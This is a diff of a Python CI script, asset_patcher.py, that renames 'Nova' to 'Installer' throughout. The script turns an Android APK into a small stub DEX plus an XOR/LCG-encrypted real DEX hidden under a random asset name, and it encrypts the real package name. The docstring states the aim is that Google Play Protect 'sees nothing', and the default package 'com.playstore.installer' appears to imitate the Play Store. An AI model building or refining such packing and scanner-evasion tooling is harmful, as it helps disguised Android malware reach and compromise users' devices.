@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 """
-asset_patcher.py — Phase 3 Step 27 (Nova Stub DEX)
+asset_patcher.py — Phase 3 Step 27 (Installer Stub DEX)
 
 Runs in CI AFTER Gradle assembleRelease.
-Transforms Nova APK from 601KB DEX to tiny stub:
+Transforms Installer APK from 601KB DEX to tiny stub:
 
-  BEFORE: classes.dex = 601KB (all Nova code — GPP sees everything)
+  BEFORE: classes.dex = 601KB (all Installer code — GPP sees everything)
   AFTER:  classes.dex = ~15KB (AppEntry stub only — GPP sees nothing)
           assets/<ASSET_B>.bin = LCG+nibble+XOR encrypted real DEX (IRT.apk CryptoCore)
           ASSET_B = random 8-char hex per build (from BuildConfig.ASSET_B via FingerprintPlugin)
 
 Usage:
-  python3 scripts/asset_patcher.py --apk path/to/nova.apk
+  python3 scripts/asset_patcher.py --apk path/to/installer.apk
 """
 
 import argparse
@@ -83,7 +83,7 @@ def encrypt_dex(dex_bytes: bytes, seed: int) -> bytes:
 def patch_pkg_in_dex(stub_dex: bytes, real_pkg: str) -> bytes:
     """
     Replace REAL_PKG_ENC placeholder bytes in base DEX with XOR-encrypted
-    real Nova package name.
+    real Installer package name.
 
     AppEntry.kt contains REAL_PKG_ENC: 50 bytes of 0xAA.
     This placeholder is patched here with XOR-encrypted real package name.
@@ -672,7 +672,7 @@ def patch_apk(apk_path: str, stub_dex: bytes, payload_bytes: bytes, payload_asse
 # ── Main ──────────────────────────────────────────────────────────────────────
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("--apk",         required=True, help="Path to Nova APK")
+    parser.add_argument("--apk",         required=True, help="Path to Installer APK")
     parser.add_argument("--stub-kt",     default="app/src/main/java/com/playstore/installer/AppEntry.kt")
     parser.add_argument("--android-sdk", default=os.environ.get("ANDROID_SDK_ROOT", ""))
     parser.add_argument("--pkg",         default="com.playstore.installer")
@@ -705,7 +705,7 @@ def main():
         print(f"  [WARN] --asset-b not provided, using fallback: {fallback}")
 
     print("="*60)
-    print("Nova Stub DEX Patcher — Phase 3 Step 27")
+    print("Installer Stub DEX Patcher — Phase 3 Step 27")
     print("="*60)
     print(f"Input APK:     {args.apk}")
     print(f"Android SDK:   {args.android_sdk}")
@@ -794,7 +794,7 @@ def main():
     print(f"  ✅ Original APK replaced — phase2_resign.py will handle signing")
 
     print("\n" + "="*60)
-    print("✅ Nova Stub DEX Patcher Complete")
+    print("✅ Installer Stub DEX Patcher Complete")
     print(f"  Original DEX: {len(real_dex)//1024}KB → Stub DEX: {len(stub_dex)//1024}KB")
     print(f"  Payload encrypted: {len(payload_bytes)//1024}KB → {payload_asset}")
     print("="*60)
